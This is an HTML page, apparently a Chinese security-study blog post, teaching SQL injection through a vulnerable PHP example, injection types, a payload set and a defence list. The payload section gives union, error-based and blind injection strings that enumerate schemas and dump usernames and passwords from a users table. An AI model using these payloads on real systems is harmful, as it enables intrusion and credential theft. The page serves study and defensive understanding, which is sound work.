@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lvyatan.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12,"width":280},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null,"show_result":true},"fold":{"enable":false,"height":500},"language":false,"border_radius":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="0x00 前言SQL 注入长期占据 OWASP Top10 头部位置，是 Web 渗透中最经典、杀伤力最强的漏洞之一。本文梳理基础原理、常见类型与实战 Payload，作为学习笔记存档。  注：本文仅用于合法授权环境下的安全研究。  0x01 原理后端直接将用户输入拼接到 SQL 语句中，未做过滤或参数化，导致攻击者可以改变 SQL 语义。 典型漏洞代码（PHP）： 123$id &#x3D; $_GET[">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL 注入从入门到实战笔记">
+<meta property="og:url" content="https://lvyatan.github.io/2026/08/28/SQL%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E6%88%98/index.html">
+<meta property="og:site_name" content="网安学习笔记">
+<meta property="og:description" content="0x00 前言SQL 注入长期占据 OWASP Top10 头部位置，是 Web 渗透中最经典、杀伤力最强的漏洞之一。本文梳理基础原理、常见类型与实战 Payload，作为学习笔记存档。  注：本文仅用于合法授权环境下的安全研究。  0x01 原理后端直接将用户输入拼接到 SQL 语句中，未做过滤或参数化，导致攻击者可以改变 SQL 语义。 典型漏洞代码（PHP）： 123$id &#x3D; $_GET[">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-08-28T06:20:00.000Z">
+<meta property="article:modified_time" content="2026-09-01T09:28:17.290Z">
+<meta property="article:author" content="lvyatan">
+<meta property="article:tag" content="Web 安全">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="OWASP Top10">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://lvyatan.github.io/2026/08/28/SQL%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E6%88%98/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://lvyatan.github.io/2026/08/28/SQL%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E6%88%98/","path":"2026/08/28/SQL注入从入门到实战/","title":"SQL 注入从入门到实战笔记"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL 注入从入门到实战笔记 | 网安学习笔记</title>
+  
+
+
+
+
+
+
+
+
+  
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">网安学习笔记</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">网络安全学习与渗透测试实践</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%88%86%E7%B1%BB"><span class="nav-number">3.</span> <span class="nav-text">0x02 分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%AE%9E%E6%88%98-Payload-%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">0x03 实战 Payload 集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5-Union-based"><span class="nav-number">4.1.</span> <span class="nav-text">1. 联合查询注入 (Union-based)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-Error-based"><span class="nav-number">4.2.</span> <span class="nav-text">2. 报错注入 (Error-based)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.3.</span> <span class="nav-text">3. 布尔盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.4.</span> <span class="nav-text">4. 时间盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E9%98%B2%E5%BE%A1"><span class="nav-number">5.</span> <span class="nav-text">0x04 防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90"><span class="nav-number">6.</span> <span class="nav-text">0x05 工具推荐</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E7%BB%93%E8%AF%AD"><span class="nav-number">7.</span> <span class="nav-text">0x06 结语</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lvyatan"
+      src="https://avatars.githubusercontent.com/lvyatan">
+  <p class="site-author-name" itemprop="name">lvyatan</p>
+  <div class="site-description" itemprop="description">个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/lvyatan" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lvyatan" rel="noopener me" target="_blank"><i class="fa fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2427719053@qq.com" title="E-Mail → mailto:2427719053@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lvyatan.github.io/2026/08/28/SQL%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E6%88%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/lvyatan">
+      <meta itemprop="name" content="lvyatan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网安学习笔记">
+      <meta itemprop="description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQL 注入从入门到实战笔记 | 网安学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL 注入从入门到实战笔记
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-08-28 14:20:00" itemprop="dateCreated datePublished" datetime="2026-08-28T14:20:00+08:00">2026-08-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-09-01 17:28:17" itemprop="dateModified" datetime="2026-09-01T17:28:17+08:00">2026-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web-%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">Web 渗透</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>584</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>SQL 注入长期占据 OWASP Top10 头部位置，是 Web 渗透中最经典、杀伤力最强的漏洞之一。本文梳理基础原理、常见类型与实战 Payload，作为学习笔记存档。</p>
+<blockquote>
+<p>注：本文仅用于合法授权环境下的安全研究。</p>
+</blockquote>
+<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>后端直接将用户输入拼接到 SQL 语句中，未做过滤或参数化，导致攻击者可以改变 SQL 语义。</p>
+<p>典型漏洞代码（PHP）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id = <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
+
+<p>输入 <code>id=1 OR 1=1</code> 后，SQL 变成 <code>SELECT * FROM users WHERE id = 1 OR 1=1</code>，返回全部用户。</p>
+<h2 id="0x02-分类"><a href="#0x02-分类" class="headerlink" title="0x02 分类"></a>0x02 分类</h2><p>按注入点位置分：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>特征</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>回显注入</td>
+<td>结果直接返回页面</td>
+<td><code>union select</code></td>
+</tr>
+<tr>
+<td>报错注入</td>
+<td>利用数据库报错带出数据</td>
+<td><code>extractvalue</code>, <code>updatexml</code></td>
+</tr>
+<tr>
+<td>盲注</td>
+<td>无回显，靠布尔&#x2F;时间判断</td>
+<td><code>and sleep(5)</code></td>
+</tr>
+<tr>
+<td>二次注入</td>
+<td>数据先存入再触发</td>
+<td>注册处存 payload</td>
+</tr>
+</tbody></table>
+<h2 id="0x03-实战-Payload-集"><a href="#0x03-实战-Payload-集" class="headerlink" title="0x03 实战 Payload 集"></a>0x03 实战 Payload 集</h2><h3 id="1-联合查询注入-Union-based"><a href="#1-联合查询注入-Union-based" class="headerlink" title="1. 联合查询注入 (Union-based)"></a>1. 联合查询注入 (Union-based)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 1. 判断注入点</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; -- </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span> <span class="comment">-- </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 5 -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 2. 判列数 &amp; 找回显位</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">-- </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 查库</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 -- </span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">-- </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 查表</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 5. 查列</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">-- </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 6. 查数据</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username,0x3a,password),3 from users -- </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-报错注入-Error-based"><a href="#2-报错注入-Error-based" class="headerlink" title="2. 报错注入 (Error-based)"></a>2. 报错注入 (Error-based)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- MySQL 5.1+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select user()),0x7e)) -- </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> version()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">-- </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-布尔盲注"><a href="#3-布尔盲注" class="headerlink" title="3. 布尔盲注"></a>3. 布尔盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and substr((select database()),1,1)=&#x27;</span>s<span class="string">&#x27; -- </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-时间盲注"><a href="#4-时间盲注" class="headerlink" title="4. 时间盲注"></a>4. 时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(substr((select database()),1,1)=&#x27;</span>s<span class="string">&#x27;,sleep(3),1) -- </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><ol>
+<li><strong>参数化查询</strong>（最佳方案）：使用 PDO 预编译 &#x2F; MyBatis <code>#&#123;&#125;</code> &#x2F; Java PreparedStatement。</li>
+<li><strong>输入校验</strong>：白名单校验类型、长度。</li>
+<li><strong>最小权限</strong>：DB 账号只读 + 只能查指定库。</li>
+<li><strong>WAF</strong>：作为补充防线，不能替代代码层防御。</li>
+<li><strong>审计</strong>：对自研 ORM 重点 review。</li>
+</ol>
+<h2 id="0x05-工具推荐"><a href="#0x05-工具推荐" class="headerlink" title="0x05 工具推荐"></a>0x05 工具推荐</h2><ul>
+<li><strong>sqlmap</strong>：自动化注入神器，支持 6 大数据库</li>
+<li><strong>BurpSuite Intruder</strong>：手工测试 + 批量 fuzz</li>
+<li><strong>NoSQLi Scanner</strong>：NoSQL 注入场景</li>
+</ul>
+<h2 id="0x06-结语"><a href="#0x06-结语" class="headerlink" title="0x06 结语"></a>0x06 结语</h2><p>SQL 注入虽”老”，但每年仍有大量在野漏洞。理解原理 + 多看 Payload + 多打靶场（sqli-labs、DVWA），是掌握它的唯一路径。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>lvyatan
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://lvyatan.github.io/2026/08/28/SQL%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E6%88%98/" title="SQL 注入从入门到实战笔记">https://lvyatan.github.io/2026/08/28/SQL注入从入门到实战/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Web-%E5%AE%89%E5%85%A8/" rel="tag"># Web 安全</a>
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+              <a href="/tags/OWASP-Top10/" rel="tag"># OWASP Top10</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/08/25/Nmap%E6%89%AB%E6%8F%8F%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/" rel="prev" title="Nmap 扫描技巧总结">
+                  <i class="fa fa-angle-left"></i> Nmap 扫描技巧总结
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/09/05/Metasploit%E5%9F%BA%E7%A1%80%E5%AE%9E%E6%88%98/" rel="next" title="Metasploit 基础实战笔记">
+                  Metasploit 基础实战笔记 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-shield"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">true</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">11k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">41 分钟</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+<canvas id="particle-canvas"></canvas>
+<script>
+(function () {
+  'use strict';
+
+  // ====================================================================
+  // 1. 粒子动效：Canvas 粒子 + 连线 + 鼠标吸引
+  // ====================================================================
+  function initParticles() {
+    var canvas = document.getElementById('particle-canvas');
+    if (!canvas) return;
+    var ctx = canvas.getContext('2d');
+    var dpr = window.devicePixelRatio || 1;
+    var particles = [];
+    var mouse = { x: -9999, y: -9999, radius: 140 };
+
+    // 配置
+    var COLORS = ['#a78bfa', '#60a5fa', '#34d399', '#f472b6'];
+    var MAX_PARTICLES = window.innerWidth < 768 ? 38 : 70;
+    var LINK_DISTANCE = 130;
+
+    function resize() {
+      canvas.width = window.innerWidth * dpr;
+      canvas.height = window.innerHeight * dpr;
+      canvas.style.width = window.innerWidth + 'px';
+      canvas.style.height = window.innerHeight + 'px';
+      ctx.scale(dpr, dpr);
+    }
+
+    function Particle() {
+      this.x = Math.random() * window.innerWidth;
+      this.y = Math.random() * window.innerHeight;
+      this.vx = (Math.random() - 0.5) * 0.35;
+      this.vy = (Math.random() - 0.5) * 0.35;
+      this.radius = Math.random() * 2 + 1.2;
+      this.color = COLORS[Math.floor(Math.random() * COLORS.length)];
+      this.baseAlpha = Math.random() * 0.4 + 0.4;
+    }
+
+    Particle.prototype.update = function () {
+      // 鼠标吸引
+      var dx = mouse.x - this.x;
+      var dy = mouse.y - this.y;
+      var dist = Math.sqrt(dx * dx + dy * dy);
+      if (dist < mouse.radius) {
+        var force = (mouse.radius - dist) / mouse.radius;
+        this.vx += (dx / dist) * force * 0.06;
+        this.vy += (dy / dist) * force * 0.06;
+      }
+
+      // 摩擦
+      this.vx *= 0.985;
+      this.vy *= 0.985;
+
+      // 限速
+      var speed = Math.sqrt(this.vx * this.vx + this.vy * this.vy);
+      if (speed > 1.5) {
+        this.vx = (this.vx / speed) * 1.5;
+        this.vy = (this.vy / speed) * 1.5;
+      }
+
+      this.x += this.vx;
+      this.y += this.vy;
+
+      // 边界回弹
+      if (this.x < 0 || this.x > window.innerWidth) this.vx *= -1;
+      if (this.y < 0 || this.y > window.innerHeight) this.vy *= -1;
+      this.x = Math.max(0, Math.min(window.innerWidth, this.x));
+      this.y = Math.max(0, Math.min(window.innerHeight, this.y));
+    };
+
+    Particle.prototype.draw = function () {
+      ctx.beginPath();
+      ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+      ctx.fillStyle = this.color;
+      ctx.globalAlpha = this.baseAlpha;
+      ctx.fill();
+
+      // 柔光
+      ctx.beginPath();
+      ctx.arc(this.x, this.y, this.radius * 3, 0, Math.PI * 2);
+      var grad = ctx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.radius * 3);
+      grad.addColorStop(0, this.color);
+      grad.addColorStop(1, 'transparent');
+      ctx.fillStyle = grad;
+      ctx.globalAlpha = 0.12;
+      ctx.fill();
+      ctx.globalAlpha = 1;
+    };
+
+    function drawLinks() {
+      for (var i = 0; i < particles.length; i++) {
+        for (var j = i + 1; j < particles.length; j++) {
+          var p1 = particles[i];
+          var p2 = particles[j];
+          var dx = p1.x - p2.x;
+          var dy = p1.y - p2.y;
+          var dist = Math.sqrt(dx * dx + dy * dy);
+          if (dist < LINK_DISTANCE) {
+            var alpha = (1 - dist / LINK_DISTANCE) * 0.22;
+            ctx.beginPath();
+            ctx.strokeStyle = p1.color;
+            ctx.globalAlpha = alpha;
+            ctx.lineWidth = 1;
+            ctx.moveTo(p1.x, p1.y);
+            ctx.lineTo(p2.x, p2.y);
+            ctx.stroke();
+            ctx.globalAlpha = 1;
+          }
+        }
+      }
+    }
+
+    function animate() {
